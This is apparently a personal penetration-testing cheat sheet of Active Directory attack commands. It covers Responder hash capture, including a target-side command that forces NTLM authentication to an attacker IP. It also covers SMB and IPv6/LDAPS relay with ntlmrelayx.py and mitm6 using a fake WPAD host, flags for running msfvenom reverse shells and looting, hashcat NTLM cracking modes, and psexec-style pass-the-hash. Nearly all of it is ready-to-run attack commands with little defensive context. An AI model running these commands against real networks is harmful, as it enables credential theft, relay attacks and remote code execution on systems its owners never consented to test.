	# responder.py

## Getting users hash after getting shell
```
sudo responder -I eth0 -dwv
```


```powershell
# you can get user ntlm hash after getting reverse shell on a target using responder and sending gci command 
sudo responder -I eth0 # on attacker
gci \\10.10.10.10\test\test # on target

```


## SMB Relay 

First we need to:
disable responding on SMB and HTTP edit
```bash
/usr/share/responder/Responder.conf # edit turn off smb and http
```

Then we configure ntlmrelayx.py

### ntlmrelayx.py
```bash
ntlmrelayx.py -tf targets.txt -smb2support

-e # to execute a file (msfvenom rev shell etc.)
-c # command (e.g. whoami)
-6 # for IPv6
-t # target 
-l # loot
# Getting interactive shell
-i # for interactive shell


ntlmrelayx.py -6 -t ldaps://IP -wh  fakewpad.marvel.local -l lootme # IPv6 ldaps attack e.g

-w # wpad
```


### nmap check
```bash
# nmap script to check for smb signing disabled
nmap --script=smb2-security-mode.nse -p445 IP/RANGE
```


# hashcat
hashcat -m # hash code -a ATTACKTYPE 0 or empty hashfile wordlist 
NTLM 1000
NTLMv2 5600



# psexec.py or metasploit #passhash
    used for: 
	    1- passing hashes
		2- creates a remote service by uploading a randomly-named executable to the hidden Windows ADMIN$ share, registering a service via RPC and the Windows Service Control Manager, and then communicating over named a named pipe
	usage 1 : 
	    psexec.py USUERNAME:@IP -hashes HASH
	usage 2 :
	  psexec.py SHARE/ADMIN_ACCOUNT:"PASSWORD\!"@IP
	usage 3 :
      psexec.py DOMAIN/USERNAME:PASSWORD@IP 

## More tools like psexec :

Less noisy start with these
smbexec
wmiexec

# mitm6
```bash
mimt6 -d DOMAIN # start mimt6

# then start relay attack using ntlmrelayx.py
ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakewpad.DOMAIN -l loot


-6 # IPv6
-t # target Domain Controller
-wh # wpad name eg. fakewpad.marvel.local
-l # dump info to file called loot
```